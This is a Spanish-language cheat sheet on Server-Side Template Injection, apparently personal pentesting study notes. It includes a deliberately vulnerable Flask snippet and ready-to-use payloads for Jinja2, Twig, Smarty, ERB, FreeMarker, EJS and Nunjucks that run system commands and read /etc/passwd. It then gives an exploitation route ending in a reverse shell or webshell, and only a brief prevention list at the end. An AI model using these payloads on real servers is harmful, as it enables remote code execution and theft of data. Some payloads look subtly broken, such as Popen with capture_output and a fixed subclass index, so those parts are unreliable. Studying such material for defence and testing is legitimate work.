# 🗂️ SSTI – Server-Side Template Injection (Obsidian Edition)

## 🔹 Índice

- [Qué es SSTI](#qu%C3%A9-es-ssti)
    
- [Tecnologías afectadas](#tecnolog%C3%ADas-afectadas)
    
- [Identificación de la vulnerabilidad](#identificaci%C3%B3n-de-la-vulnerabilidad)
    
- [Explotación por lenguaje](#explotaci%C3%B3n-por-lenguaje)
    
    - [Python (Jinja2/Django)](#python-jinja2django)
        
    - [PHP (Twig/Smarty)](#php-twigsmarty)
        
    - [Ruby (ERB/Liquid)](#ruby-erbliquid)
        
    - [Java (Thymeleaf/FreeMarker)](#java-thymeleaffreemarker)
        
    - [Node.js (EJS/Nunjucks)](#nodejsejsnunjucks)
        
- [Payloads útiles](#payloads-%C3%BAtiles)
    
- [Rutas de explotación](#rutas-de-explotaci%C3%B3n)
    
- [Prevención](#prevenci%C3%B3n)
    

---

## Qué es SSTI

> **Definición:** Vulnerabilidad que permite inyectar código en plantillas del lado servidor, pudiendo generar **ejecución remota de código (RCE)**.

- **Cómo ocurre:** Los datos del usuario se insertan en plantillas sin **escape ni validación**, permitiendo que se ejecuten como código.
    

**Ejemplo conceptual (Python/Jinja2)**:
```

from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get("name")
    template = f"Hello {name}!"
    return render_template_string(template)
```

## Tecnologías afectadas

|Lenguaje|Motores de Plantillas|
|---|---|
|Python|Jinja2, Mako, Django|
|PHP|Twig, Smarty|
|Ruby|ERB, Liquid|
|Java|Thymeleaf, FreeMarker|
|Node.js|EJS, Nunjucks|

---

## Identificación de la vulnerabilidad

### Prueba básica por motor:

```
`Jinja2/Django: {{7*7}}`
`Twig (PHP): {{7*7}}`
`Smarty (PHP): {$smarty.const.SEVEN*7}`
`ERB (Ruby): <%= 7*7 %>`
`Liquid (Ruby): {{ 7*7 }}`
`Thymeleaf (Java): ${7*7}`
`FreeMarker (Java): ${7*7}`
`EJS (Node.js): <%= 7*7 %>`
`Nunjucks (Node.js): {{ 7*7 }}`
```


### Prueba avanzada

- Exposición de variables internas:
    

`Jinja2: {{ config.items() }} Twig: {{ _self }} ERB: <%= defined?(Rails) %>`

- Acceso a objetos del sistema:
    

`Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}`

---

## Explotación por lenguaje

### Python (Jinja2/Django)

`1️⃣ Confirmar SSTI: {{7*7}} → 49 2️⃣ Enumerar clases: {{ ''.__class__.__mro__[1].__subclasses__() }} 3️⃣ Ejecutar comandos: {{ ''.__class__.__mro__[1].__subclasses__()[40]('id', shell=True, capture_output=True).stdout }} 4️⃣ Leer archivos: {{ ''.__class__.__mro__[1].__subclasses__()[40]('cat /etc/passwd', shell=True, capture_output=True).stdout }}`

### PHP (Twig/Smarty)

`# Twig básico {{ 7*7 }} # Ejecutar comando {{ _self.env.getGlobals()._REQUEST|exec('id') }} # Leer archivo {{ _self.env.getGlobals()._REQUEST|file_get_contents('/etc/passwd') }}`

`{$smarty.const.PHP_OS} {php} system('id'); {/php} # RCE`

### Ruby (ERB/Liquid)

``# ERB <%= 7*7 %> <%= `id` %>           # Comando <%= File.read('/etc/passwd') %>  # Leer archivo``

`{{ 7*7 }}  # Limitado, sandbox`

### Java (Thymeleaf/FreeMarker)

`<!-- Thymeleaf --> <span th:text="${7*7}"></span> <!-- FreeMarker --> ${7*7} <#assign r="freemarker.template.utility.Execute"?new()>${r("id")}`

### Node.js (EJS/Nunjucks)

`# EJS <%= 7*7 %> <%= require('child_process').execSync('id') %>`

`# Nunjucks {{ 7*7 }} {{ 'string' | attr('constructor')('return global.process')() }}`

---

## Payloads útiles

|Objetivo|Python|PHP/Twig|Ruby/ERB|Java/FreeMarker|Node.js/EJS|
|---|---|---|---|---|---|
|Ejecutar comando|`subprocess.Popen(...)`|`exec('cmd')`|`` `cmd` ``|`Execute("cmd")`|`child_process.execSync('cmd')`|
|Leer archivos|`cat /etc/passwd`|`file_get_contents`|`File.read`|`Execute("cat /etc/passwd")`|`fs.readFileSync('/etc/passwd')`|
|Listar directorios|`ls -la`|`scandir`|`Dir.entries('.')`|`Execute("ls -la")`|`fs.readdirSync('.')`|
|Variables internas|`config.items()`|`_self`|`defined?(Rails)`|`config`|`process.env`|

---

## Rutas de explotación

1. **Identificación:** Probar con payloads simples (`7*7`).
    
2. **Enumeración:** Buscar variables y clases disponibles.
    
3. **Ejecución:** Probar comandos simples (`id`, `whoami`).
    
4. **Lectura:** Archivos sensibles (`/etc/passwd`, `config.php`).
    
5. **Escalada:** Shell reversa o webshell según permisos.
    

---

## Prevención

- No renderizar plantillas con datos del usuario sin filtrar.
    
- Usar escape automático (`autoescape=True`).
    
- Validar y sanitizar entradas.
    
- Revisar permisos de ejecución de funciones críticas (`exec`, `system`, etc.).
    
- Limitar exposición de variables y objetos internos.